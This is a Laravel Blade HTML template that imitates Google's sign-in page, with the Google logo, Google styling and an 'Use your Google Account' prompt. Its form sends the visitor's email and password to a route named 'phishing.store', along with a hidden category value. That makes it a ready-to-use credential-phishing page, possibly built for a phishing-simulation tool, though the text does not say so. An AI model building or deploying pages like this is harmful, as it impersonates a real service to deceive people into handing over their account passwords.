<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Sign In</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #fff;
            font-family: 'Roboto', Arial, sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .google-container {
            max-width: 450px;
            width: 100%;
            padding: 20px;
        }
        
        .google-card {
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 40px 40px 36px;
            text-align: center;
        }
        
        .google-logo {
            margin-bottom: 20px;
        }
        
        .google-logo-text {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
        }
        
        .google-subtitle {
            font-size: 16px;
            font-weight: 400;
            margin-bottom: 32px;
            color: #202124;
        }
        
        .form-control {
            border-radius: 4px;
            padding: 13px 15px;
            height: 48px;
            font-size: 16px;
            border: 1px solid #dadce0;
        }
        
        .form-control:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }
        
        .btn-google {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            padding: 10px 24px;
            margin-top: 16px;
            width: 100%;
            height: 40px;
        }
        
        .btn-google:hover {
            background-color: #1565c0;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
        }
        
        .google-help {
            color: #1a73e8;
            font-weight: 500;
            font-size: 14px;
            text-decoration: none;
            margin-top: 16px;
            display: inline-block;
        }
        
        .google-help:hover {
            background-color: rgba(26, 115, 232, 0.04);
        }
        
        .google-footer {
            display: flex;
            justify-content: space-between;
            margin-top: 32px;
            padding: 16px 0 0;
            color: #5f6368;
            font-size: 12px;
        }
        
        .language-select {
            padding: 6px 8px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 12px;
            color: #202124;
        }
        
        .google-links a {
            color: #5f6368;
            text-decoration: none;
            margin-left: 24px;
            font-size: 12px;
        }
        
        .google-links a:hover {
            text-decoration: underline;
        }
        
        .alert-success {
            background-color: #34a853;
            color: white;
            border: none;
            border-radius: 4px;
            text-align: center;
            font-size: 14px;
            padding: 12px;
            margin-bottom: 20px;
        }
        
        @media (max-width: 480px) {
            .google-card {
                border: none;
                padding: 24px;
            }
            
            .google-footer {
                flex-direction: column;
                align-items: center;
                gap: 16px;
            }
            
            .google-links {
                display: flex;
                flex-wrap: wrap;
                justify-content: center;
                gap: 16px;
            }
            
            .google-links a {
                margin: 0;
            }
        }
    </style>
</head>
<body>
    <div class="google-container">
        <div class="text-center mb-4">
            <div class="google-logo">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92" width="92" height="30">
                    <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
                    <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
                    <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
                    <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
                    <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
                    <path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/>
                </svg>
            </div>
            <h1 class="google-logo-text">Sign in</h1>
            <p class="google-subtitle">Use your Google Account</p>
        </div>

        <div class="google-card">
            @if(session('success'))
                <div class="alert alert-success">{{ session('success') }}</div>
            @endif

            <form action="{{ route('phishing.store') }}" method="POST">
                @csrf
                <input type="hidden" name="category" value="{{ $category }}">

                <div class="mb-3">
                    <input type="email" class="form-control" id="email" name="email" placeholder="Email or phone" required>
                </div>

                <div class="mb-3">
                    <input type="password" class="form-control" id="password" name="password" placeholder="Enter your password" required>
                </div>
                    <a href="#" class="google-help">Forgot email?</a>
                <div class="d-flex justify-content-between align-items-center">
                    
                    <button type="submit" class="btn btn-google">Next</button>
                    
                </div>
            </form>
        </div>

        <div class="google-card mt-4 text-center">
            <p class="mb-0">Don't have an account? <a href="#" class="google-help">Create account</a></p>
        </div>

        <div class="google-footer">
            <select class="language-select">
                <option>English (United States)</option>
                <option>Español</option>
                <option>Français</option>
                <option>中文</option>
            </select>
            
            <div class="google-links">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>